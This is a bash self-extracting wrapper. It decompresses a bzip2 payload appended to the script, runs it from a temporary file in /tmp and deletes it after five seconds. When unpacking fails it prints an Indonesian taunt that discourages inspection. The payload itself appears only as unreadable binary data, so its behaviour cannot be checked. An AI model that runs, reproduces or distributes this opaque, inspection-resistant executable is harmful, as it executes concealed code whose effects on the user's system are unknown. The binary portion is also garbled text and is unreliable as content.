#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��  �_�@0}s��8��
����P�׍��֣�bdɣ	�bi�L#0	$MO(4��� �$I�H�4P @Ѡ��4�ɓF�� �0F`H@D�M<���T�H�j2<��a щ�H���1a�fC�*t�Q�ЉT��	���l����ʚ�/�.cGꔮ	��攄����>���ݸ��g<q����҂*Ȫλ��l�"҅��3L�1n5��ţE,8��ŧ������g]or �)�9n�*2p�Aj,K>�D�HN� �z�r���RF&_W�ڜo.#�$\Yt���j�D��(�4���Efm�������a�� �� ��"m��1���I��R�,ԇ�J���A�u���h"�@;a[X�`���bGw B/�i�J
q�H�FP�y�|�DX��B�+��F����M�����B0��r��=8;��q�v�w�����榼��H�T\��Vh�7�ǳ���3I�@�� ��}w�	^{ os�������&����Gg��K�=�;nA�%�,�*ܟ�-{���E6]>�?K7%�\����`��������w�>;��c��A�Zwж,���9p��8��
��z�#��ijr:O�.fU8�]�f��)�2�e����d�T������4��&��P���G�=�X��a^_aB��Z[OS9w�IG��
gX7I����TA��|��4M�2ʙ�� M�I�[�-AFpի��-�n���#yS��>t�8:8̥T�q��{㯠�-��!������Z]�� ��4���B6� ��9	���.�b����V:go�Sɴ,�,�T�.��R�Vڜ�	Ű��H�
a� �